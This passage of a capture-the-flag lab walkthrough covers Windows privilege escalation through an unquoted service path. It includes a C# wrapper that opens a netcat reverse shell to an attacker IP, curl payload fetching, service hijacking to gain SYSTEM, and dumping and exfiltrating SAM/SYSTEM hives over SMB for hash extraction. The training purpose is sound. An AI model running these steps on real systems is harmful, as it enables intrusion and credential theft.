System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe  Auto       
Windows Defender Antivirus Network Inspection Service                               WdNisSvc                                  "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2011.6-0\NisSrv.exe"               Manual     
Windows Defender Antivirus Service                                                  WinDefend                                 "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2011.6-0\MsMpEng.exe"              Auto       
Windows Media Player Network Sharing Service                                        WMPNetworkSvc                             "C:\Program Files\Windows Media Player\wmpnetwk.exe"                                        Manual     
```

Pay attention to the service with a path without quotation marks around. This indicates that it might be vulnerable to an Unquoted Service Path attack.

First we check what account it runs under.

```shell
C:\xampp\htdocs\resources\uploads>sc qc SystemExplorerHelpService
sc qc SystemExplorerHelpService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

This service is running as the local system account.

If the directory is writable we might use this to the unquoted service path vulnerability.

```shell
C:\xampp\htdocs\resources\uploads>powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer
Owner  : BUILTIN\Administrators
Group  : WREATH-PC\None
Access : BUILTIN\Users Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         BUILTIN\Users Allow  -1610612736
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
Audit  : 
Sddl   : O:BAG:S-1-5-21-3963238053-2357614183-4023578609-513D:AI(A;OICI;FA;;;BU)(A;ID;FA;;;S-1-5-80-956008885-341852264
         9-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-22714784
         64)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;
         BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;
         ;;S-1-15-2-2)
```

Great, builtin users have `FullControl`.

## Task 43 - AV Evasion - Privilege Escalation

Time to create an executable for the privilege escalation. Here using `mono` dotnet core compiler for Linux to compile C# executables that can be run on Windows targets.

`sudo apt install mono-devel`

We will create a wrapper that will execute our custom build nc-DA.exe from previous steps. Create `Wrapper.cs` file with following content, change to match your exe file, IP and port.

```C#
using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-DA.exe", "10.50.102.113 8000  -e cmd.exe");
            procInfo.CreateNoWindow = true;
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
```

This is the imports:

```C#
using System;
using System.Diagnostics;
```

This will initialize a namespace and class for the program:

```C#
namespace Wrapper{
    class Program{
        static void Main(){
            //Our code will go here!
        }
    }
}
```

And `Main()` is where we call our netcat.

All set, let's compile.

```shell
kali@attacker:~/wreath/wrapper$ mcs Wrapper.cs 
kali@attacker:~/wreath/wrapper$ file Wrapper.exe 
Wrapper.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

Now, let's upload it.

Start local web server in the wrapper directory.

```shell
kali@attacker:~/wreath/wrapper$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

And fetch it on the windows machine.

```shell
C:\xampp\htdocs\resources\uploads>curl http://10.50.102.113/Wrapper.exe -o %TEMP%\wrapper-DA.exe            
curl http://10.50.102.113/Wrapper.exe -o %TEMP%\wrapper-DA.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3584  100  3584    0     0   3584      0  0:00:01 --:--:--  0:00:01  7168

C:\xampp\htdocs\resources\uploads>dir %TEMP%\wrapper-DA.exe
dir %TEMP%\wrapper-DA.exe
 Volume in drive C has no label.
 Volume Serial Number is A041-2802

 Directory of C:\Users\Thomas\AppData\Local\Temp

29/02/2024  10:03             3,584 wrapper-DA.exe
               1 File(s)          3,584 bytes
               0 Dir(s)   6,947,098,624 bytes free

```

Execute it and head back to the local listener.

```shell
C:\xampp\htdocs\resources\uploads>%TEMP%\wrapper-DA.exe
%TEMP%\wrapper-DA.exe

C:\xampp\htdocs\resources\uploads>
```

The local listener.

```shell
kali@attacker:~/wreath$ sudo nc -lvnp 8000
[sudo] password for kali: 
listening on [any] 8000 ...
connect to [10.50.102.113] from (UNKNOWN) [10.200.101.100] 50344
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\resources\uploads>
```

Now, the service path is `C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe`. This means we have three options to copy and execute the script.

- root directory and call it Program.exe.
- `C:\Program Files (x86)\` directory and call it System.exe.
- `C:\Program Files (x86)\System Explorer\` and call it System.exe.

Note in the room:

```text
Before blindly copying your wrapper, check to make sure that another user isn't currently performing this exploit:

`dir "C:\Program Files (x86)\System Explorer\"`

If you see a file called System.exe in the output then please wait a few minutes until it disappears.

If there is not already an exploit in the directory then it's time to root this thing!
```

Copy the wrapper.

```shell
C:\xampp\htdocs\resources\uploads>copy %TEMP%\wrapper-DA.exe "C:\Program Files (x86)\System Explorer\System.exe"
copy %TEMP%\wrapper-DA.exe "C:\Program Files (x86)\System Explorer\System.exe"
        1 file(s) copied.

C:\xampp\htdocs\resources\uploads>dir "C:\Program Files (x86)\System Explorer\"
dir "C:\Program Files (x86)\System Explorer\"
 Volume in drive C has no label.
 Volume Serial Number is A041-2802

 Directory of C:\Program Files (x86)\System Explorer

29/02/2024  10:12    <DIR>          .
29/02/2024  10:12    <DIR>          ..
21/12/2020  23:55    <DIR>          System Explorer
29/02/2024  10:03             3,584 System.exe
               1 File(s)          3,584 bytes
               3 Dir(s)   6,945,546,240 bytes free
```

Now let's stop and start the service.

```shell
C:\xampp\htdocs\resources\uploads>sc stop SystemExplorerHelpService
sc stop SystemExplorerHelpService

SERVICE_NAME: SystemExplorerHelpService 
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x1388

C:\xampp\htdocs\resources\uploads>sc start SystemExplorerHelpService
sc start SystemExplorerHelpService
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

```

And back to the local listener we can see we got root.

```shell
kali@attacker:~/wreath$ sudo nc -lvnp 8000
[sudo] password for kali: 
listening on [any] 8000 ...
connect to [10.50.102.113] from (UNKNOWN) [10.200.101.100] 50444
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

As good practice, let us also cleanup.

```shell
C:\Windows\system32>del "C:\Program Files (x86)\System Explorer\System.exe"
del "C:\Program Files (x86)\System Explorer\System.exe"

C:\Windows\system32>sc start SystemExplorerHelpService
sc start SystemExplorerHelpService

SERVICE_NAME: SystemExplorerHelpService 
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2156
        FLAGS              : 

C:\Windows\system32>
```

## Task 44 - Exfiltration - Exfiltration Techniques & Post Exploitation

Now we need to prove that we hacked Thomas PC. Let us do that by getting the local user hashes from the windows machine. They are stored in the registry while computer is running, in the `HKEY_LOCAL_MACHINE\SAM`. And it is also available in `C:\Windows\System32\Config\SAM`. This will not be readable while the computer is running. So let's dump them.

Save SAM hive.

```shell
C:\Windows\system32>reg.exe save HKLM\SAM sam.bak
reg.exe save HKLM\SAM sam.bak
The operation completed successfully.

```

We also need the `SYSTEM` hive that contain the boot key.

```shell
C:\Windows\system32>reg.exe save HKLM\SYSTEM system.bak
reg.exe save HKLM\SYSTEM system.bak
The operation completed successfully.
```

Now let us start a smb server on our local machine using impacket smbserver.py

```shell
kali@attacker:~/wreath$ sudo python3 /opt/impacket/examples/smbserver.py  share . -smb2support -username user -password s3cureP@ssword
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
```

Back to the windows machine we can now connect our smbserver on our attacker machine IP (in this case tun0 interface). And now move the files from the windows machine to our local attacker machine.

```shell
C:\Windows\system32>net use \\10.50.102.113\share /USER:user s3cureP@ssword          
net use \\10.50.102.113\share /USER:user s3cureP@ssword
The command completed successfully.


C:\Windows\system32>move sam.bak \\10.50.102.113\share\sam.bak
move sam.bak \\10.50.102.113\share\sam.bak
        1 file(s) moved.

C:\Windows\system32>move system.bak \\10.50.102.113\share\system.bak
move system.bak \\10.50.102.113\share\system.bak
        1 file(s) moved.
```

Now we can use Impacket library `secretsdump.py` to get the hashes on our local attacker machine.

```shell
kali@attacker:~/wreath$ python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:<MASKED>
Guest:501:<MASKED>
DefaultAccount:503:<MASKED>
WDAGUtilityAccount:504:<MASKED>
Thomas:1000:<MASKED>
person:1001:<MASKED>
[*] Cleaning up... 
kali@attacker:~/wreath$ 

```

I will end here, but in a real scenario the findings shall be documented in a report and presented to Thomas.
